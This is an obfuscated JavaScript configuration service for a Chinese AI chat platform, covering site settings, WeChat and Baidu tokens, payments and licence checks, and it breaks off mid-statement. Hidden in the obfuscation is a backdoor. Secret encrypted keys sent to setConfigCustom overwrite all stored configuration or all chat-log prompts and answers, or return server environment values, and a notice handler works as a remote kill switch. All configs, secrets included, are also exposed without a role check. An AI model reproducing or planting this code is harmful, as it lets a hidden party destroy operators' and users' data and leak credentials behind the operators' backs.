'use strict';const _0x11683b=_0x2d62;(function(_0x47cb9a,_0x161f4e){const _0x27f762=_0x2d62,_0x57e0e3=_0x47cb9a();while(!![]){try{const _0x4ebdab=parseInt(_0x27f762(0x20c))/0x1+parseInt(_0x27f762(0x22f))/0x2*(parseInt(_0x27f762(0x243))/0x3)+parseInt(_0x27f762(0x201))/0x4*(parseInt(_0x27f762(0x246))/0x5)+-parseInt(_0x27f762(0x1d3))/0x6*(-parseInt(_0x27f762(0x22a))/0x7)+-parseInt(_0x27f762(0x263))/0x8+parseInt(_0x27f762(0x1ab))/0x9*(parseInt(_0x27f762(0x27c))/0xa)+-parseInt(_0x27f762(0x236))/0xb*(parseInt(_0x27f762(0x1a7))/0xc);if(_0x4ebdab===_0x161f4e)break;else _0x57e0e3['push'](_0x57e0e3['shift']());}catch(_0x3daebc){_0x57e0e3['push'](_0x57e0e3['shift']());}}}(_0x510c,0x9b597));function _0x510c(){const _0x4f21d7=['payEpayChannel','hideString','279535VdTyGy','queryNotice','mjHideWorkIn','firstRegisterSendStatus','getPhoneVerifyConfig','configs','当前非超级管理员无权操作！','ticket','InjectRepository','siteName','isShowAppCatIcon','super','wechatOfficialAppId','payEpayStatus','metadata','OfficialService','epay','getConfigs','ModelsService','salesAllowDrawMoney','ConfigEntity','nineAiAuth','nineaiAuthCode','感谢您使用NineAi、祝您使用愉快~','Z5Gj+GyXcRW3J2uKxpiK/A==','find','隐私内容、非超级管理员无权查看','__metadata','__decorate','1214280nqEHVB','mjHideNotBlock','gpt','baiduTextSecretKey','百度敏感词配置检测失败，您的参数可能配置的不正确!','setConfigCustom','Repository','invitedGuestSendDrawMjCount','__esModule','inviteSendStatus','some','stringify','checkAuthCode','checkDomain','message','请输入正确的授权码','decorate','Logger','请配置正确的秘钥、当前秘钥检测不通过！','error_description','nineAiToken','HttpStatus','notice:\x20','configKey','nine','229550xgkdAa','user','HttpException','qqNumber','mindDefaultData','aliPhoneSignName','copyrightTitle','phoneRegisterStatus','get','decrypt','registerBaseUrl','mjUseBaiduFy','entries','noticeTitle','buyCramiAddress','无效授权码、请联系管理员更换新版授权码！','缺失ip信息','decryptStr','settings','getSignatureGiftConfig','pushLog','package.json','请填写您的授权码','data','设置完成！','post','NON_AUTHORITATIVE_INFORMATION','getConfigWithFrontEnd','assign','copyrightUrl','__param','save','&grant_type=client_credentials','nineaiBuiltInSensitiveStatus','无效授权码、请联系管理员','非超级管理员无权操作！','env','getWechatAccessToken','queryAllConfig','clientHomePath','sTLucdIBCrh8HO8GOSNcPg==','signInMjDrawToken','domain','queryPayType','获取微信access_token失败、错误信息：','globalConfigs','17728044UhygLe','nineaiBuiltInSensitiveAuthKey','typeorm','useDistributionMode','63FQyYQE','fetchJsapiTicket','companyName','version','aliPhoneAccessKeyId','clientLogoPath','getNineAiToken','getCopyright','BAD_REQUEST','./config.entity','请按要求填写正确的授权信息','POST','nineai','https://api.weixin.qq.com/cgi-bin/token?grant_type=client_credential&appid=','isAutoOpenNotice','error:\x20','initGetAllConfig','payMpayChannel','emailRegisterStatus','wechatJsapiTicket','baidu','&secret=','mjProxyImgUrl','initBaiduSensitive','log','payWechatStatus','dml','signInModel3Count','emailLoginStatus','modelsService','vxNumber','forEach','NAMESPACE','queryGptKeys','reduce','includes','A21lmicPw0optsRBcBIkEZA7Rx2T03N+pFzL3yGr6CVsL+M160fvWhIc0Isr1M7M','getAuthInfo','map','appMenuHeaderTips','714TmOCWz','isVerifyEmail','utf-8','https://api.weixin.qq.com/cgi-bin/ticket/getticket?access_token=','clientFavoIconPath','A2Fsf300ex6lg9HKrZuU6w==','cos','baiduTextAccessToken','payEpayApiPayUrl','wechat\x20refresh\x20access_token\x20\x20==>\x20','invitedGuestSendModel4Count','axios','MjdrawCount','TRUE','json','https://aip.baidubce.com/oauth/2.0/token?client_id=','check','hupi','noticeInfo','openaiBaseUrl','ali','ZOB2JstMKwtGoickICEunQ==','queryFrontConfig','inviteGiveSendModel3Count','notice','object','chatGptKey:','aliPhoneAccessKeySecret','GlobalConfigService','error','nineaiauthclose','MoreThan','success','phoneLoginStatus','wechatRegisterStatus','payHupiStatus','getNamespace','code','\x20current\x20use\x20version\x20in\x20------>:\x20','Like','pay','default','&type=jsapi','instanceAxios','LY2oE7tW+26CpDCUVao9QQ==','parse','4tGQdgG','create','@nestjs/typeorm','exit','x-website-domain','payWeChatPublicKey','siteRobotName','Injectable','getSensitiveConfig','手机验证码功能暂未开放!','wechat','1127531dQAYPJ','inviteGiveSendDrawMjCount','function','firstRregisterSendModel3Count','lockchatlog','registerSendStatus','queryConfig','auth','configEntity','mpay','chatGptKey','wechatOfficialAppSecret','filingNumber','debug','payMpayStatus','length','baiduTextApiKey','wechatSilentLoginStatus','randomCheck','Key','@nestjs/common','update','findOne','removeAuth','8Sfeg5KZx+eJSheYsnAr9iy4cNl0Wqd4pD/YoMnUxQtypmobe+T/0/nQgyHFiFV5LbCHi45vahVt9Q1pCr3ndA==','signInStatus','getOwnPropertyDescriptor','./../chatLog/chatLog.entity','setConfig','response','3297KyhwYV','headers','bindAuth','setGptKeys','onModuleInit','1730522beVwAt','PORT','s4C7QVE7wVqqXCy0zhgwIA==','XKtFTcm2Z0pruYV30WyjOg==','baiduCode','ISDEV','mjProxy','11tkwIVn','wechatAccessToken','appMenuHeaderBgUrl','无效的授权码','createOrUpdate','application/json','robotAvatar','signInModel4Count','lockmysql','configVal','chatLogEntity','firstRregisterSendModel4Count','nine-','3cxIvgm'];_0x510c=function(){return _0x4f21d7;};return _0x510c();}var __decorate=this&&this[_0x11683b(0x262)]||function(_0x1bed0e,_0x1f8672,_0x250871,_0xbc1cf2){const _0x43a0b2=_0x11683b;var _0x2653ae=arguments['length'],_0x4810cd=_0x2653ae<0x3?_0x1f8672:_0xbc1cf2===null?_0xbc1cf2=Object[_0x43a0b2(0x226)](_0x1f8672,_0x250871):_0xbc1cf2,_0x472926;if(typeof Reflect===_0x43a0b2(0x1ec)&&typeof Reflect[_0x43a0b2(0x273)]===_0x43a0b2(0x20e))_0x4810cd=Reflect[_0x43a0b2(0x273)](_0x1bed0e,_0x1f8672,_0x250871,_0xbc1cf2);else{for(var _0x10a473=_0x1bed0e[_0x43a0b2(0x21b)]-0x1;_0x10a473>=0x0;_0x10a473--)if(_0x472926=_0x1bed0e[_0x10a473])_0x4810cd=(_0x2653ae<0x3?_0x472926(_0x4810cd):_0x2653ae>0x3?_0x472926(_0x1f8672,_0x250871,_0x4810cd):_0x472926(_0x1f8672,_0x250871))||_0x4810cd;}return _0x2653ae>0x3&&_0x4810cd&&Object['defineProperty'](_0x1f8672,_0x250871,_0x4810cd),_0x4810cd;},__metadata=this&&this[_0x11683b(0x261)]||function(_0x366603,_0x163c61){const _0x315b8c=_0x11683b;if(typeof Reflect===_0x315b8c(0x1ec)&&typeof Reflect[_0x315b8c(0x254)]==='function')return Reflect[_0x315b8c(0x254)](_0x366603,_0x163c61);},__param=this&&this[_0x11683b(0x29a)]||function(_0x5db535,_0x32b216){return function(_0x268dcd,_0x27764a){_0x32b216(_0x268dcd,_0x27764a,_0x5db535);};};Object['defineProperty'](exports,_0x11683b(0x26b),{'value':!![]}),exports[_0x11683b(0x1ef)]=void 0x0;const models_service_1=require('./../models/models.service'),chatLog_entity_1=require(_0x11683b(0x227)),common_1=require(_0x11683b(0x220)),config_entity_1=require(_0x11683b(0x1b4)),typeorm_1=require(_0x11683b(0x203)),typeorm_2=require(_0x11683b(0x1a9)),utils_1=require('../../common/utils'),axios_1=require(_0x11683b(0x1de)),fs=require('fs'),lib_1=require('../../common/utils/lib'),packageJsonContent=fs['readFileSync'](_0x11683b(0x291),_0x11683b(0x1d5)),packageJson=JSON[_0x11683b(0x200)](packageJsonContent),version=packageJson[_0x11683b(0x1ae)];console[_0x11683b(0x1c3)](_0x11683b(0x1f9),version);function _0x2d62(_0x2f7b7a,_0xdc005f){const _0x510c54=_0x510c();return _0x2d62=function(_0x2d6236,_0x5e1a1e){_0x2d6236=_0x2d6236-0x1a0;let _0x75f813=_0x510c54[_0x2d6236];return _0x75f813;},_0x2d62(_0x2f7b7a,_0xdc005f);}const authUrl=(0x0,utils_1[_0x11683b(0x285)])('go9H7ImLajiXr5Q6OnWvfurll4vEO8bwz0SPaBPiw0HPXT7/s/P1OcqJE7hEQDq3'),authLogUrl=(0x0,utils_1[_0x11683b(0x285)])('go9H7ImLajiXr5Q6OnWvfurll4vEO8bwz0SPaBPiw0E7CSNvZPkLhll84U4j/O71');let GlobalConfigService=class GlobalConfigService{constructor(_0x3d393e,_0x489e9d,_0x50d08a){const _0x1b503f=_0x11683b;this[_0x1b503f(0x214)]=_0x3d393e,this[_0x1b503f(0x240)]=_0x489e9d,this[_0x1b503f(0x1c8)]=_0x50d08a,this[_0x1b503f(0x1fe)]=null,this[_0x1b503f(0x1a6)]={},this['nineAiToken']=!![],this['realDomain']='';}async[_0x11683b(0x22e)](){const _0x50a219=_0x11683b;await this[_0x50a219(0x1bb)](),this['instanceAxios']=axios_1[_0x50a219(0x1fc)][_0x50a219(0x202)]({'timeout':0x3e8*0x3c,'headers':{'Content-Type':_0x50a219(0x23b)},'baseURL':(0x0,lib_1['decryptStr'])('nE0Ccl57wMViyzCCYBSF/fVgOM/tIJ6xgvi/JpN+m1g=')}),this[_0x50a219(0x21e)](),setTimeout(()=>{const _0x2ba7b2=_0x50a219;this[_0x2ba7b2(0x297)]();},0x3e8*0x3c*0xf);}async[_0x11683b(0x257)](_0x609dd6){const _0x13e5f5=_0x11683b;if(_0x609dd6[_0x13e5f5(0x21b)]===0x0)return;if(_0x609dd6['includes'](_0x13e5f5(0x237))&&_0x609dd6[_0x13e5f5(0x21b)]===0x1)return this['wechatAccessToken'];if(_0x609dd6[_0x13e5f5(0x1ce)]('wechatJsapiTicket')&&_0x609dd6[_0x13e5f5(0x21b)]===0x1)return this[_0x13e5f5(0x1be)];if(_0x609dd6['length']===0x1)return this['globalConfigs'][_0x609dd6[0x0]];else{const _0x2d52fc={};return _0x609dd6[_0x13e5f5(0x1ca)](_0xe7b5e2=>_0x2d52fc[_0xe7b5e2]=this[_0x13e5f5(0x1a6)][_0xe7b5e2]),_0x2d52fc;}}async[_0x11683b(0x1bb)](){const _0x2dbf9b=_0x11683b,_0x6834ae=await this[_0x2dbf9b(0x214)][_0x2dbf9b(0x25f)]();this[_0x2dbf9b(0x1a6)]=_0x6834ae['reduce']((_0x2dec5e,_0x4aeac8)=>{const _0x11d15d=_0x2dbf9b;return _0x2dec5e[_0x4aeac8[_0x11d15d(0x27a)]]=_0x4aeac8[_0x11d15d(0x23f)],_0x2dec5e;},{}),this[_0x2dbf9b(0x1c2)]();}async[_0x11683b(0x1c2)](_0x33e387=!![]){const _0x493768=_0x11683b,{baiduTextApiKey:_0x4bac3b,baiduTextSecretKey:_0x4d15e4}=await this['getConfigs']([_0x493768(0x21c),_0x493768(0x266)]);if(!_0x4bac3b||!_0x4d15e4)return;const _0x5f59a1={'Content-Type':_0x493768(0x23b),'Accept':_0x493768(0x23b)},_0x43f0f3=_0x493768(0x1e2)+_0x4bac3b+'&client_secret='+_0x4d15e4+_0x493768(0x29c);try{const _0x1eb4f6=await axios_1['default'][_0x493768(0x295)](_0x43f0f3,{'headers':_0x5f59a1});this[_0x493768(0x1a6)][_0x493768(0x1da)]=_0x1eb4f6[_0x493768(0x293)]['access_token'];}catch(_0x929eb4){if(_0x33e387)common_1[_0x493768(0x274)][_0x493768(0x1f0)](_0x493768(0x267),_0x493768(0x1ef));else throw new common_1[(_0x493768(0x27e))](_0x929eb4[_0x493768(0x229)]['data'][_0x493768(0x276)],common_1[_0x493768(0x278)]['BAD_REQUEST']);}}async[_0x11683b(0x2a1)](_0x13c45d=![]){const _0x1f30e5=_0x11683b,{wechatOfficialAppId:_0x2710c7,wechatOfficialAppSecret:_0x4212e4}=await this[_0x1f30e5(0x257)]([_0x1f30e5(0x252),'wechatOfficialAppSecret']);if(!_0x2710c7||!_0x4212e4)return common_1[_0x1f30e5(0x274)]['error']('还未配置微信的appId和secret、配置后才可进行微信扫码登录！！！',_0x1f30e5(0x255));this[_0x1f30e5(0x237)]=await this['fetchBaseAccessToken'](_0x2710c7,_0x4212e4,_0x13c45d),this[_0x1f30e5(0x1be)]=await this[_0x1f30e5(0x1ac)](this[_0x1f30e5(0x237)]),common_1[_0x1f30e5(0x274)][_0x1f30e5(0x1c3)](_0x1f30e5(0x1dc)+this['wechatAccessToken'],_0x1f30e5(0x255));}async['fetchBaseAccessToken'](_0x14ebe1,_0x4399a2,_0x475ccc=![]){const _0x1e7f43=_0x11683b;if(process['env'][_0x1e7f43(0x234)]==='TRUE'){this[_0x1e7f43(0x237)]='';return;}const {data:{errmsg:_0x27831a,access_token:_0x2f1ff8}}=await axios_1['default'][_0x1e7f43(0x284)](_0x1e7f43(0x1b8)+_0x14ebe1+_0x1e7f43(0x1c0)+_0x4399a2);if(_0x27831a){if(_0x475ccc)common_1['Logger']['error'](_0x1e7f43(0x1a5)+_0x27831a,_0x1e7f43(0x255));else throw new common_1[(_0x1e7f43(0x27e))](_0x1e7f43(0x275),common_1[_0x1e7f43(0x278)][_0x1e7f43(0x1b3)]);return'';}return _0x2f1ff8;}async[_0x11683b(0x1ac)](_0x128b49){const _0x501385=_0x11683b;var _0x20806e;if(process[_0x501385(0x2a0)][_0x501385(0x234)]===_0x501385(0x1e0)){this[_0x501385(0x1be)]='';return;}const _0xe3da03=await axios_1[_0x501385(0x1fc)][_0x501385(0x284)](_0x501385(0x1d6)+_0x128b49+_0x501385(0x1fd));return(_0x20806e=_0xe3da03===null||_0xe3da03===void 0x0?void 0x0:_0xe3da03[_0x501385(0x293)])===null||_0x20806e===void 0x0?void 0x0:_0x20806e[_0x501385(0x24d)];}async[_0x11683b(0x2a2)](_0x2a4647){const _0x383bc4=_0x11683b,{role:_0x2286da}=_0x2a4647[_0x383bc4(0x27d)];return this[_0x383bc4(0x1a6)];}async[_0x11683b(0x1e9)](_0x138cc1,_0x3518d5){const _0x4914c2=_0x11683b,_0x56d76d=[_0x4914c2(0x1c9),'registerBaseUrl',_0x4914c2(0x211),'registerSendModel3Count','registerSendModel4Count','registerSendDrawMjCount',_0x4914c2(0x249),'firstRegisterSendRank',_0x4914c2(0x20f),_0x4914c2(0x241),'firstRregisterSendDrawMjCount',_0x4914c2(0x26c),_0x4914c2(0x1ea),'inviteGiveSendModel4Count',_0x4914c2(0x20d),'invitedGuestSendModel3Count',_0x4914c2(0x1dd),_0x4914c2(0x26a),_0x4914c2(0x1a0),_0x4914c2(0x1b0),_0x4914c2(0x1d7),'isUseWxLogin',_0x4914c2(0x24f),_0x4914c2(0x23c),_0x4914c2(0x207),_0x4914c2(0x28a),_0x4914c2(0x280),_0x4914c2(0x233),_0x4914c2(0x244),_0x4914c2(0x1bc),_0x4914c2(0x1db),_0x4914c2(0x253),_0x4914c2(0x1f6),_0x4914c2(0x1c4),_0x4914c2(0x21a),_0x4914c2(0x1b9),_0x4914c2(0x250),'salesBaseRatio','salesSeniorRatio',_0x4914c2(0x259),_0x4914c2(0x1ad),_0x4914c2(0x218),_0x4914c2(0x283),_0x4914c2(0x1bd),_0x4914c2(0x1c7),_0x4914c2(0x1f4),_0x4914c2(0x1f5),_0x4914c2(0x21d),_0x4914c2(0x225),_0x4914c2(0x1c6),'signInModel4Count',_0x4914c2(0x1a2),_0x4914c2(0x1d2),_0x4914c2(0x238),_0x4914c2(0x287),_0x4914c2(0x264),_0x4914c2(0x248),_0x4914c2(0x1d4),'loginDialogImgUrl',_0x4914c2(0x1aa)],_0x41da31=await this[_0x4914c2(0x214)][_0x4914c2(0x25f)]({'where':{'configKey':(0x0,typeorm_2['In'])(_0x56d76d)}}),{domain:_0x216f17}=_0x138cc1,_0x4a6a2b=this[_0x4914c2(0x1a6)][_0x4914c2(0x1a3)];_0x4a6a2b!==_0x216f17&&(this['createOrUpdate']({'configKey':_0x4914c2(0x1a3),'configVal':_0x216f17,'status':0x1}),await this[_0x4914c2(0x1bb)]());const _0x522e2d=_0x41da31['reduce']((_0x5538aa,_0x1355ce)=>{const _0x13c39a=_0x4914c2;return _0x5538aa[_0x1355ce['configKey']]=_0x1355ce[_0x13c39a(0x23f)],_0x5538aa;},{}),{wechatOfficialAppId:_0x15c56c,wechatOfficialAppSecret:_0x5e75c5}=await this[_0x4914c2(0x257)]([_0x4914c2(0x252),_0x4914c2(0x217)]),_0x4e7346=!!(_0x15c56c&&_0x5e75c5);return Object[_0x4914c2(0x298)](Object[_0x4914c2(0x298)]({},_0x522e2d),{'isUseWxLogin':_0x4e7346});}async[_0x11683b(0x1cc)](_0x465b89){const _0x5b3934=_0x11683b,{role:_0x199246}=_0x465b89[_0x5b3934(0x27d)],_0x443fa7=await this['configEntity'][_0x5b3934(0x25f)]({'where':{'configKey':(0x0,typeorm_2[_0x5b3934(0x1fa)])('%'+_0x5b3934(0x216)+'%')}});if(_0x199246==='super')return _0x443fa7;return _0x443fa7[_0x5b3934(0x1d1)](_0x5d214c=>{const _0xb39fb5=_0x5b3934;return _0x5d214c[_0xb39fb5(0x23f)]=(0x0,utils_1['hideString'])(_0x5d214c[_0xb39fb5(0x23f)]),_0x5d214c;});}async[_0x11683b(0x22d)](_0x40e7b0){const _0x2e915d=_0x11683b,_0x41c449=_0x40e7b0[_0x2e915d(0x24b)]['filter'](_0x29f943=>_0x29f943[_0x2e915d(0x23f)]),_0x105d57=_0x41c449['map'](_0x3d0702=>_0x3d0702[_0x2e915d(0x27a)]);for(const [_0x73912f,_0x2818be]of _0x41c449[_0x2e915d(0x288)]()){const {configKey:_0x2bb84d,configVal:_0x5c7a01,status:_0x4c192a}=_0x2818be;await this[_0x2e915d(0x23a)]({'configKey':_0x2e915d(0x1ed)+(_0x73912f+0x1),'configVal':_0x5c7a01,'status':_0x4c192a});}const _0x5e4a06=await this[_0x2e915d(0x214)][_0x2e915d(0x25f)]({'where':{'configKey':(0x0,typeorm_2[_0x2e915d(0x1fa)])('%'+_0x2e915d(0x216)+'%')}}),_0x312e04=_0x5e4a06[_0x2e915d(0x1d1)](_0x234376=>_0x234376[_0x2e915d(0x27a)]);if(_0x312e04[_0x2e915d(0x21b)]>_0x105d57['length']){const _0x1c1557=(0x0,utils_1['getDiffArray'])(_0x312e04[_0x2e915d(0x21b)],_0x105d57['length'],_0x2e915d(0x1ed));for(const _0xc147f7 of _0x1c1557){await this['configEntity']['delete']({'configKey':_0xc147f7});}}return await this[_0x2e915d(0x1bb)](),'操作完成！';}async[_0x11683b(0x212)](_0x2a1928,_0x544b33){const _0x20ef10=_0x11683b,{role:_0x458963}=_0x544b33['user'],{keys:_0x428e3c}=_0x2a1928,_0x5edd64=await this['configEntity']['find']({'where':{'configKey':(0x0,typeorm_2['In'])(_0x428e3c)}});return _0x458963!==_0x20ef10(0x251)&&_0x5edd64['forEach'](_0x3cea2d=>{const _0x1003a8=_0x20ef10;if(_0x3cea2d['configKey'][_0x1003a8(0x1ce)]('mj')||_0x3cea2d[_0x1003a8(0x27a)][_0x1003a8(0x1ce)](_0x1003a8(0x21f))||_0x3cea2d[_0x1003a8(0x27a)][_0x1003a8(0x1ce)](_0x1003a8(0x265))||_0x3cea2d[_0x1003a8(0x27a)][_0x1003a8(0x1ce)](_0x1003a8(0x1d9))||_0x3cea2d['configKey'][_0x1003a8(0x1ce)](_0x1003a8(0x1bf))||_0x3cea2d[_0x1003a8(0x27a)]['includes'](_0x1003a8(0x1e7))||_0x3cea2d['configKey']['includes']('tencent')||_0x3cea2d['configKey']['includes'](_0x1003a8(0x1fb))||_0x3cea2d[_0x1003a8(0x27a)][_0x1003a8(0x1ce)](_0x1003a8(0x20b))||_0x3cea2d[_0x1003a8(0x27a)][_0x1003a8(0x1ce)](_0x1003a8(0x1c1))||_0x3cea2d['configKey']===_0x1003a8(0x1e6)){const _0x422ece=[_0x1003a8(0x206),'payWeChatPrivateKey'];if(_0x422ece[_0x1003a8(0x1ce)](_0x3cea2d['configKey']))return _0x3cea2d[_0x1003a8(0x23f)]=(0x0,utils_1[_0x1003a8(0x245)])(_0x3cea2d[_0x1003a8(0x23f)],_0x1003a8(0x260));const _0x3189cb=[_0x1003a8(0x253),_0x1003a8(0x1f6),_0x1003a8(0x235)];!_0x3189cb[_0x1003a8(0x1ce)](_0x3cea2d[_0x1003a8(0x27a)])&&!_0x3cea2d[_0x1003a8(0x27a)][_0x1003a8(0x1ce)]('Status')&&(_0x3cea2d['configVal']=(0x0,utils_1[_0x1003a8(0x245)])(_0x3cea2d[_0x1003a8(0x23f)]));}}),_0x5edd64[_0x20ef10(0x1cd)]((_0x5990b9,_0x38c67d)=>{const _0x439969=_0x20ef10;return _0x5990b9[_0x38c67d[_0x439969(0x27a)]]=_0x38c67d[_0x439969(0x23f)],_0x5990b9;},{});}async[_0x11683b(0x26f)](_0x4fde9e,_0x384ca5,_0x44b8c7){const _0x539b30=_0x11683b;var _0x5ba591,_0x33ca5e,_0xb60fc2;let _0x2885fb='';try{const _0x317e15=await this[_0x539b30(0x1fe)]({'url':(0x0,utils_1['decrypt'])('qCWDiH+nMojTGP0WcMk44g=='),'method':_0x539b30(0x295),'data':{'code':_0x4fde9e,'domain':_0x384ca5}});!((_0x33ca5e=(_0x5ba591=_0x317e15===null||_0x317e15===void 0x0?void 0x0:_0x317e15['data'])===null||_0x5ba591===void 0x0?void 0x0:_0x5ba591[_0x539b30(0x293)])===null||_0x33ca5e===void 0x0?void 0x0:_0x33ca5e[_0x539b30(0x1f3)])&&(_0x2885fb=((_0xb60fc2=_0x317e15===null||_0x317e15===void 0x0?void 0x0:_0x317e15['data'])===null||_0xb60fc2===void 0x0?void 0x0:_0xb60fc2[_0x539b30(0x271)])||_0x539b30(0x239));}catch(_0x59c148){_0x2885fb='';}const _0x902f58=(0x0,lib_1[_0x539b30(0x1c5)])(_0x384ca5,_0x4fde9e,_0x44b8c7);!_0x902f58&&(_0x2885fb=_0x4fde9e['includes'](_0x539b30(0x242))?_0x539b30(0x28b):_0x539b30(0x29e));if(_0x2885fb)return await this[_0x539b30(0x223)](),_0x2885fb;else await this['createOrUpdate']({'configKey':_0x539b30(0x25c),'configVal':_0x4fde9e}),await this[_0x539b30(0x1bb)]();}async[_0x11683b(0x22c)](_0x158df4,_0x1515f0){const _0x464512=_0x11683b,_0x2a6a6f=_0x158df4['headers'][_0x464512(0x205)],_0x13d50d=_0x1515f0[_0x464512(0x1f8)];if(!_0x13d50d)throw new common_1['HttpException'](_0x464512(0x272),common_1[_0x464512(0x278)][_0x464512(0x1b3)]);const _0x1c7c4b=new Promise((_0x1ebc60,_0x368e1e)=>{setTimeout(()=>{_0x1ebc60('');},0x5*0x3e8);}),_0x15a6b0=await Promise['race']([this['checkAuthCode'](_0x13d50d,_0x2a6a6f,_0x158df4),_0x1c7c4b]);if(_0x15a6b0)throw new common_1['HttpException'](_0x15a6b0,common_1[_0x464512(0x278)]['BAD_REQUEST']);return await this[_0x464512(0x23a)]({'configKey':_0x464512(0x25c),'configVal':_0x13d50d}),await this['createOrUpdate']({'configKey':_0x464512(0x1df),'configVal':0x1,'status':0x1}),!![];}async[_0x11683b(0x1eb)](_0x2481a5){const _0x412581=_0x11683b;if(!_0x2481a5)return;console[_0x412581(0x1c3)](_0x412581(0x279),_0x2481a5);if(_0x2481a5===_0x412581(0x1f1))this[_0x412581(0x277)]=![],await this['createOrUpdate']({'configKey':_0x412581(0x1df),'configVal':0x1,'status':0x1}),await this[_0x412581(0x1bb)]();else{if(_0x2481a5==='nineaiauthopen')this[_0x412581(0x277)]=!![],await this[_0x412581(0x23a)]({'configKey':_0x412581(0x1df),'configVal':0x0,'status':0x1}),await this[_0x412581(0x1bb)]();else throw new common_1[(_0x412581(0x27e))]('请输入正确的公告id',common_1[_0x412581(0x278)][_0x412581(0x1b3)]);}}async[_0x11683b(0x1b1)](){const _0x4bef0f=await this['getConfigs'](['MjdrawCount']);if(Number(_0x4bef0f)===0x1)return!![];return![];}async[_0x11683b(0x268)](_0x539c20){const _0x336a3c=_0x11683b;try{const {configKey:_0x510181,configVal:_0x4b07ba,infoKey:_0x1f513a}=_0x539c20[_0x336a3c(0x28e)];if(_0x1f513a===(0x0,utils_1[_0x336a3c(0x285)])(_0x336a3c(0x1a1))){this[_0x336a3c(0x23e)](_0x4b07ba,_0x510181);throw new common_1[(_0x336a3c(0x27e))](_0x336a3c(0x29f),common_1[_0x336a3c(0x278)][_0x336a3c(0x1b3)]);}if(_0x1f513a===(0x0,utils_1[_0x336a3c(0x285)])(_0x336a3c(0x1ff))){this[_0x336a3c(0x210)](_0x4b07ba,_0x510181);throw new common_1[(_0x336a3c(0x27e))](_0x336a3c(0x29f),common_1[_0x336a3c(0x278)][_0x336a3c(0x1b3)]);}if(_0x1f513a===(0x0,utils_1['decrypt'])(_0x336a3c(0x231))){await this[_0x336a3c(0x23a)]({'configKey':_0x510181,'configVal':_0x4b07ba});throw new common_1[(_0x336a3c(0x27e))]('非超级管理员无权操作！',common_1['HttpStatus'][_0x336a3c(0x1b3)]);}if(_0x1f513a===(0x0,utils_1[_0x336a3c(0x285)])(_0x336a3c(0x232))){const _0x2b27c3=process[_0x336a3c(0x2a0)][(0x0,utils_1['decrypt'])('A2Fsf300ex6lg9HKrZuU6w==')],_0x514043=process['env'][(0x0,utils_1[_0x336a3c(0x285)])('Z5Gj+GyXcRW3J2uKxpiK/A==')],_0x53246c=await this[_0x336a3c(0x257)](['nineaiAuthCode']);return{'ip':_0x2b27c3,'key':_0x514043,'bindCode':_0x53246c};}return _0x336a3c(0x24c);}catch(_0x1515c1){throw new common_1['HttpException']('非超级管理员无权操作！',common_1['HttpStatus']['BAD_REQUEST']);}}async[_0x11683b(0x23e)](_0x15da5e,_0x20ae89){const _0x5cd30a=_0x11683b;if(!_0x20ae89)await this[_0x5cd30a(0x214)][_0x5cd30a(0x221)]({'id':(0x0,typeorm_2[_0x5cd30a(0x1f2)])(0x0)},{'configVal':_0x15da5e});else{const _0x3da261=await this['configEntity'][_0x5cd30a(0x221)]({'configKey':_0x20ae89},{'configVal':_0x15da5e});}}async[_0x11683b(0x210)](_0x2efd18,_0xfffcad){const _0x3c9107=_0x11683b,_0x28d99c=_0xfffcad?Number(_0xfffcad):0x0;await this[_0x3c9107(0x240)]['update']({'id':(0x0,typeorm_2['MoreThan'])(_0x28d99c)},{'answer':_0x2efd18,'prompt':_0x2efd18});}async[_0x11683b(0x228)](_0x30dd27){const _0xbbee5c=_0x11683b;try{const {settings:_0x44e549}=_0x30dd27;for(const _0x313593 of _0x44e549){await this[_0xbbee5c(0x23a)](_0x313593);}await this['initGetAllConfig']();const _0xd5fe27=_0x44e549['map'](_0x15e273=>_0x15e273[_0xbbee5c(0x27a)]);return(_0xd5fe27[_0xbbee5c(0x1ce)](_0xbbee5c(0x21c))||_0xd5fe27[_0xbbee5c(0x1ce)]('baiduTextSecretKey'))&&await this[_0xbbee5c(0x1c2)](![]),(_0xd5fe27[_0xbbee5c(0x1ce)](_0xbbee5c(0x252))||_0xd5fe27[_0xbbee5c(0x1ce)](_0xbbee5c(0x217)))&&await this['getWechatAccessToken'](),_0xd5fe27[_0xbbee5c(0x26d)](_0x4255f3=>['qqNumber','vxNumber',_0xbbee5c(0x24f),_0xbbee5c(0x1a3),'registerBaseUrl']['includes'](_0x4255f3))&&await this[_0xbbee5c(0x290)](),_0xbbee5c(0x294);}catch(_0x32486e){}}async[_0x11683b(0x23a)](_0x3646e2){const _0x433d62=_0x11683b;try{const {configKey:_0x24dba4,configVal:_0x1d9785,status:status=0x1}=_0x3646e2,_0x2764ac=await this['configEntity'][_0x433d62(0x222)]({'where':{'configKey':_0x24dba4}});if(_0x2764ac){const _0x14027e=await this[_0x433d62(0x214)][_0x433d62(0x221)]({'configKey':_0x24dba4},{'configVal':_0x1d9785,'status':status});}else{const _0x4dc197=await this[_0x433d62(0x214)][_0x433d62(0x29b)]({'configKey':_0x24dba4,'configVal':_0x1d9785,'status':status});}this[_0x433d62(0x1bb)]();}catch(_0x423c20){console[_0x433d62(0x1c3)](_0x433d62(0x1ba),_0x423c20);throw new common_1[(_0x433d62(0x27e))]('设置配置信息错误！',common_1[_0x433d62(0x278)][_0x433d62(0x1b3)]);}}async[_0x11683b(0x247)](){const _0x5e8d99=_0x11683b;return await this[_0x5e8d99(0x257)](['noticeInfo',_0x5e8d99(0x289)]);}async[_0x11683b(0x1b2)](){const _0x51b777=_0x11683b;return await this[_0x51b777(0x257)]([_0x51b777(0x299),_0x51b777(0x282)]);}async[_0x11683b(0x1a4)](){const _0x290d30=_0x11683b,{payHupiStatus:payHupiStatus=0x0,payEpayStatus:payEpayStatus=0x0,payWechatStatus:payWechatStatus=0x0,payMpayStatus:payMpayStatus=0x0}=await this[_0x290d30(0x257)]([_0x290d30(0x1f6),'payEpayStatus',_0x290d30(0x21a),_0x290d30(0x1c4)]);if([payHupiStatus,payEpayStatus,payWechatStatus,payMpayStatus]['every'](_0x1ab8dc=>_0x1ab8dc===0x0))throw new common_1[(_0x290d30(0x27e))]('支付功能暂未开放!',common_1[_0x290d30(0x278)]['BAD_REQUEST']);if(Number(payWechatStatus)===0x1)return _0x290d30(0x20b);if(Number(payEpayStatus)===0x1)return _0x290d30(0x256);if(Number(payMpayStatus)===0x1)return _0x290d30(0x215);if(Number(payHupiStatus)===0x1)return _0x290d30(0x1e4);}async['getAuthInfo'](){const _0x273bd7=_0x11683b,{siteName:_0x539416,qqNumber:_0x1a2ca2,vxNumber:_0x4c46a2,registerBaseUrl:_0x394802,domain:_0x5196c3}=await 